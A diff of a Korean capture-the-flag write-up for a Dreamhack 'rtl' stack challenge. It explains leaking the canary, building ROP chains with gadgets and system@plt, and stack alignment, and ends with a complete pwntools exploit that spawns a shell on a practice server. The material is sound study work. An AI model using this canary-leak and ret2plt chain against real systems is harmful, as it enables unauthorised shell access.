@@ -36,7 +36,7 @@ int main() {
 `checksec`으로 바이너리를 검사해보면, **카나리**와 **NX**가 적용되어있기 때문에 **스택에 쉘코드를 주입 후 return_address를 해당 주소로 조작하는 것은 불가능하다.** (스택이 아닌 코드 영역으로 return_address를 조작해야함) 
 
 NX로 인해 쉘코드를 스택에 주입할 수 없다고 하더라도, `바이너리의 코드 영역`과 `라이브러리의 코드 영역`에는 실행 권한이 존재하기 때문에, 해당 영역으로 return_address를 조작하면 익스플로잇이 여전히 가능하다.
-그리고 C의 표준 라이브러리인 `libc`에는 익스플로잇에 사용할 수 있는 유용한 코드 가젯이 존재한다. 바이너리의 코드 영역은 ASLR이 적용되지 않아 바이너리 생성 시 주소가 고정되어 있기 때문에 해당 코드 영역에서 익스플로잇에 필요한 가젯을 추출하여 사용할 수 있다. 
+그리고 C의 표준 라이브러리인 `libc`에는 익스플로잇에 사용할 수 있는 유용한 코드 가젯이 존재한다. `바이너리의 코드 영역`은 **ASLR이 적용되지 않아** 바이너리 생성 시 주소가 고정되어 있기 때문에 해당 코드 영역에서 익스플로잇에 필요한 가젯을 추출하여 사용할 수 있다. 
 
 하지만, **PLT**를 이용하기 위해서는 소스 코드에서 사용된 함수(심볼)만 PLT를 통해 라이브러리에서 호출해올 수 있기 때문에 이를 잘 파악해야한다. 위 소스 코드를 살펴보면, 
 
@@ -76,5 +76,79 @@ addr of "system" plt       <= ret + 0x10
 ```
 대부분의 함수는 `ret`으로 종료되므로, 함수들도 리턴 가젯으로 사용될 수 있는데 이러한 공격을 **Return_Oriented Programming(ROP)** 라고 한다.
 
-## 익스플로잇 코드
+# 익스플로잇 코드 작성
 
+## 1. 카나리 우회
+
+먼저 해당 바이너리의 버퍼와 카나리 위치를 찾기 위해 gdb를 실행하면, 아래와 같이 어느 단계에서 더이상 나아갈 수 없게 된다.
+
+<img width="841" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/7e96eab6-7ab3-4711-ad4e-478e9819613a">  
+
+그 이유는 해당 함수에서 `system`함수를 PLT 테이블에 등록하는데, 이때 `/usr/bin/dash` 프로세스가 실행되어 더이상 `main` 안에서 이후 instruction으로 나아갈 수 없게 된다.  
+
+<img width="876" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/0ee2b4f0-a90d-4537-ae98-703e888a2bc0">  
+
+따라서, `objdump -d rtl`을 통해 직접 main 함수의 어셈블리 코드를 확인한 후 `buf`가 `rbp-0x40`, 카나리가 `rbp-0x8` 에 위치한다는 것을 인지한 후 canary를 얻기 위해 `b'a'*0x39`를 가장 먼저 페이로드로 보낸다.  
+
+<img width="841" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/98c5a141-1d2d-45c0-bb81-277f7f208690">  
+
+## 2. 반환 주소 조작
+
+카나리를 우회하였다면 `sfp`를 `b'a'*0x8`로 덮은 후 반환 주소를 조작하여 `system('/bin/sh`)` 함수가 실행되도록 하여야 한다. 하지만, `system('/bin/sh')`을 한번에 완전히 실행하는 함수나 코드 가젯이 존재하지 않기 때문에, 여러 단계에 걸쳐 해당 함수를 실행해야 한다.  
+단계를 순서대로 살펴보자. 
+1. `system()` 함수를 수행하기 위해 인자에 들어갈 값인 `rdi`에 `/bin/sh` 문자열이 저장된 주소를 대입해야한다. 따라서, `pop rdi` 코드 가젯을 사용할 것인데 이를 위해 해당 코드 가젯이 위치하는 스택 바로 아래에 `/bin/sh` 문자열의 주소를 위치시키고, `pop rdi; ret`으로 리턴 가젯을 설정하여 `pop rdi` 이후 리턴 가젯을 통해 다음 익스플로잇이 이어지도록 연결한다.
+2. `rdi`에 `/bin/sh` 문자열의 주소를 저장했다면, 남은 `ret`을 통해 `system()` 함수가 실행되도록 `system@plt` 주소를 바로 다음 스택 주소에 위치시켜야한다. 이를 위해 `system@plt`의 주소를 찾아야 하는데, ASLR이 적용되어도 PIE가 적용되지 않으면 PLT 주소는 고정되어 있으므로 상수값처럼 다룰 수 있다.
+3. 참고로 `system` 함수로 `rip`가 이동할 때, `system` 함수 내부의 `movaps` 명령어 때문에 **스택이 반드시 0x10 단위로 정렬되어 있어야 한다.**   
+따라서, 만약 정상적으로 익스플로잇 코드를 작성했는데, **Segmentation Fault**가 발생한다면, return_address에 `ret` 리턴 가젯을 추가해주는 것을 기억하자.  
+***`ret` 리턴 가젯은 `pop rip`와 같은데, 여기서 return_address에 `ret`이 위치하면 `rsp`가 한칸 아래로 이동하고, `rip`가 `ret`을 다시 가리키니까 여기서 `ret`이 없을 때와 같은 상황이 됨. 따라서, 익스플로잇 코드에 영향을 안줌***  
+만약 return_address가 아니라 다른 곳에 `ret`이 위치한다면 rsp가 한칸 아래로 이동하고, 스택 바로 아래의 주소로 rip가 이동하는 것과 같은 동작을 함.
+
+
+아래는 `pop rdi; ret` 코드 가젯, `/bin/sh`이 저장된 메모리 주소, `system@plt`의 주소를 찾는 명령어와 결과이다.  
+`ROPgadget --binary <실행파일> --re "<필요한 코드 가젯>""`
+
+<img width="808" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/e3685fef-de7d-4577-bd74-455409f1af62">
+
+<img width="808" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/46d612b5-166e-45a7-8484-66935ce10c4c">
+
+<img width="821" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/56db90ae-e728-411f-9b81-77fd84d50b04">
+
+### 참고
+
+<img width="833" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/4bbcc1b2-3c08-4ae7-a54b-c466f7aeecc7">
+
+`system()` 함수를 호출하기 위해 **PLT**주소가 아닌 **GOT** 주소나 **실제 라이브러리의 시스템 콜 주소**를 입력하면 어떻게 될까라는 의문이 생겼었다.  
+의문에 대한 답을 먼저 얘기하자면 PLT 주소 이외에 GOT나 라이브러리의 함수 주소를 넣으면 실행을 할 수 없다.
+
+1. GOT는
+
+## 익스플로잇 코드
+```
+from pwn import *
+
+context.arch = 'amd64'
+
+p = remote('host3.dreamhack.games', 23240)
+
+elf = ELF('rtl')
+
+system_plt = elf.plt['system']
+#system_plt = 0x601028
+payload = b'a'*0x38
+
+p.send(payload+b'a')
+p.recvuntil(payload+b'a')
+
+canary = b'\x00' + p.recvn(7)
+
+pop_rdi_ret_gadget = 0x0000000000400853
+binish = 0x400874
+ret_gadget = 0x0000000000400285
+
+payload += canary + b'a'*0x8 + p64(ret_gadget) + p64(pop_rdi_ret_gadget) + p64(binish) + p64(system_plt)
+# payload += canary + b'a'*0x8 + p64(pop_rdi_ret_gadget) + p64(binish) + p64(system_plt)
+
+p.send(payload)
+
+p.interactive()
+```
